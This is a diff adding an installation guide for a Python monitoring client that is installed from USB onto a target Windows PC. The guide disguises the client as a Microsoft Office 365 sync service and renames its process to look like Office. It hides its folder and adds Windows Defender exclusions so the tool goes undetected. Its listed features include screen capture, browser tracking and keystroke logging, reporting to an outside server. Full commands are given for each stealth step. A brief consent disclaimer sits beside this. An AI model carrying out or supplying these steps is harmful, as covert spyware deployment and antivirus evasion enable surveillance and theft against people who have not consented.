@@ -1,0 +1,244 @@
+========================================
+  MICROSOFT OFFICE 365 SYNC SERVICE
+  USB Installation Guide
+========================================
+
+VERSION: 1.0.1
+DATE: 2025-11-24
+
+========================================
+  QUICK INSTALLATION
+========================================
+
+1. Extract tenjo_usb_installer_1.0.1.zip to USB drive
+
+2. Insert USB into target Windows PC
+
+3. Right-click INSTALL.bat → "Run as administrator"
+
+4. Follow on-screen prompts
+
+5. Done! Service runs automatically in background
+
+========================================
+  WHAT GETS INSTALLED
+========================================
+
+Location: C:\ProgramData\Microsoft\Office365Sync_XXXX (random number)
+Process: OfficeSync.exe (appears as Microsoft Office process)
+Service: Microsoft Office 365 Sync Service (Windows Service)
+Startup: Automatic (Delayed Start)
+
+========================================
+  STEALTH FEATURES
+========================================
+
+✓ Random folder name (different every install)
+✓ Process disguise (appears as Office process)
+✓ Windows Service (legitimate registration)
+✓ Windows Defender exclusions (no detection)
+✓ Hidden files (invisible in normal view)
+
+========================================
+  REQUIREMENTS
+========================================
+
+- Windows 7/8/10/11 (64-bit)
+- Python 3.6 or higher installed
+- Administrator privileges
+- Python must be in PATH
+
+========================================
+  INSTALLATION STEPS (DETAILED)
+========================================
+
+STEP 1: Prepare USB Drive
+--------------------------
+- Format USB as FAT32 or NTFS
+- Extract tenjo_usb_installer_1.0.1.zip to USB root
+- Verify files:
+  ✓ INSTALL.bat
+  ✓ UNINSTALL.bat
+  ✓ README.md
+  ✓ client\ folder
+
+STEP 2: Check Target PC
+-----------------------
+- Open Command Prompt
+- Type: python --version
+- Should show Python 3.6 or higher
+- If not installed: https://www.python.org/downloads/
+- IMPORTANT: Check "Add Python to PATH" during install
+
+STEP 3: Run Installer
+---------------------
+- Insert USB drive
+- Navigate to USB drive
+- Right-click INSTALL.bat
+- Select "Run as administrator"
+- UAC prompt → Click "Yes"
+
+STEP 4: Installation Process
+----------------------------
+The installer will:
+
+[1/5] Check Python installation
+      → Verifies Python 3.6+ in PATH
+
+[2/5] Create installation directory
+      → Random folder: C:\ProgramData\Microsoft\Office365Sync_XXXX
+      → Hide folder with system attributes
+
+[3/5] Copy client files
+      → Copy all files from USB to installation folder
+
+[4/5] Install dependencies
+      → Copy pythonw.exe → OfficeSync.exe
+      → Install Python packages from requirements.txt
+
+[5/5] Setup auto-start
+      → Add Windows Defender exclusions
+      → Register Windows Service
+      → Create hidden startup shortcut (fallback)
+      → Start service
+
+STEP 5: Verify Installation
+---------------------------
+Check Windows Services:
+- Press Win+R → services.msc → Enter
+- Look for "Microsoft Office 365 Sync Service"
+- Status should be "Running"
+- Startup Type: "Automatic (Delayed Start)"
+
+Check Task Manager:
+- Press Ctrl+Shift+Esc
+- Processes tab
+- Look for "OfficeSync.exe"
+- Should be running
+
+========================================
+  UNINSTALLATION
+========================================
+
+1. Right-click UNINSTALL.bat → "Run as administrator"
+
+2. Type YES to confirm
+
+3. Uninstaller will:
+   - Stop Windows Service
+   - Remove Windows Defender exclusions
+   - Delete installation folder
+   - Remove startup shortcuts
+   - Clean up registry entries
+
+4. Done! All traces removed
+
+========================================
+  TROUBLESHOOTING
+========================================
+
+ERROR: Python not found
+-----------------------
+Solution:
+- Install Python from https://www.python.org/downloads/
+- During install, CHECK "Add Python to PATH"
+- Restart computer
+- Run installer again
+
+ERROR: Access denied
+--------------------
+Solution:
+- Right-click INSTALL.bat
+- Select "Run as administrator"
+- Click "Yes" on UAC prompt
+
+ERROR: Service won't start
+--------------------------
+Solution:
+- Open Event Viewer (eventvwr.msc)
+- Windows Logs → Application
+- Look for "Office365Sync" errors
+- Check Python dependencies installed
+
+ERROR: Can't find installation folder
+-------------------------------------
+Solution:
+- Open Command Prompt as Administrator
+- Run: type %TEMP%\office365_path.txt
+- Shows installation path
+- OR search: dir /s /a:h "C:\ProgramData\Microsoft\Office365Sync_*"
+
+========================================
+  ADVANCED: Manual Installation
+========================================
+
+If automatic installer fails:
+
+1. Create random folder:
+   mkdir "C:\ProgramData\Microsoft\Office365Sync_5821"
+   cd "C:\ProgramData\Microsoft\Office365Sync_5821"
+
+2. Copy files from USB client\ folder
+
+3. Setup stealth:
+   attrib +h +s "%CD%"
+   copy "C:\Python3X\pythonw.exe" OfficeSync.exe
+   pip install -r requirements.txt
+
+4. Add exclusions:
+   powershell -Command "Add-MpPreference -ExclusionPath '%CD%'"
+   powershell -Command "Add-MpPreference -ExclusionProcess 'OfficeSync.exe'"
+
+5. Register service:
+   sc create "Office365Sync" binPath= "\"%CD%\OfficeSync.exe\" \"%CD%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service"
+   sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings"
+   sc start "Office365Sync"
+
+========================================
+  DETECTION & VERIFICATION
+========================================
+
+To verify service is running (for testing):
+
+Check Service:
+  sc query Office365Sync
+
+Check Process:
+  tasklist | findstr OfficeSync.exe
+
+Check Files (requires show hidden):
+  dir /s /a:h "C:\ProgramData\Microsoft\Office365Sync_*"
+
+View Logs:
+  type "C:\ProgramData\Microsoft\Office365Sync_XXXX\logs\*.log"
+
+========================================
+  SECURITY NOTES
+========================================
+
+This is employee monitoring software.
+
+LEGAL REQUIREMENTS:
+- Must have proper authorization
+- Users should be informed and consent
+- Comply with local privacy laws
+- Use only for legitimate business purposes
+
+DEPLOYED FEATURES:
+- Screen capture
+- Browser activity tracking
+- Process monitoring
+- Keystroke logging (if enabled)
+- Network activity monitoring
+
+========================================
+  SUPPORT
+========================================
+
+Server: https://tenjo.adilabs.id
+Version: 1.0.1
+Auto-update: Enabled
+
+For issues or questions, contact system administrator.
+
+========================================
